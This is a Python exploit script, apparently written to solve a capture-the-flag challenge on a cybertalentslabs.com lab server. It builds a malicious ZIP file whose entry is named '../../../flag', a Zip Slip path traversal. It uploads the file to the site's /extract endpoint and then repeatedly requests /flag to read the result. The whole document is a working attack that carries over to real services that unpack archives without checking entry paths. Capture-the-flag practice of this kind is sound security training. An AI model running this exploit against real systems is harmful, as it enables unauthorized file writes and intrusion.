import requests
import time
import os
import zipfile
import io

# URL of the application
base_url = "http://wcomekgvd0eu93rqp6v4p0gbx3g10wz0yk6mhw3o-web.cybertalentslabs.com/"

# Create a malicious ZIP file with path traversal
print("Creating malicious ZIP file...")

# Create a ZIP file in memory with a file that attempts path traversal
memory_file = io.BytesIO()
with zipfile.ZipFile(memory_file, 'w') as zf:
    # Add a file with path traversal attempt
    zf.writestr("../../../flag", "This is a path traversal attempt")

# Reset the file pointer to the beginning
memory_file.seek(0)

# Upload the malicious ZIP file
print("Uploading malicious ZIP file...")
files = {"zipFile": ("malicious.zip", memory_file)}
response = requests.post(f"{base_url}/extract", files=files)

print(f"Upload response: {response.status_code}, {response.text}")

# Now try to access the flag
print("Trying to access flag...")
flag_response = requests.get(f"{base_url}/flag")
if flag_response.status_code == 200:
    print(f"Flag found: {flag_response.text}")
else:
    print(f"Flag access failed: {flag_response.status_code}")
    
    # Try a few more times
    for i in range(5):
        time.sleep(1)
        print(f"Attempt {i+1} to access flag...")
        flag_response = requests.get(f"{base_url}/flag")
        if flag_response.status_code == 200:
            print(f"Flag found on attempt {i+1}: {flag_response.text}")
            break
        else:
            print(f"Flag access attempt {i+1} failed: {flag_response.status_code}")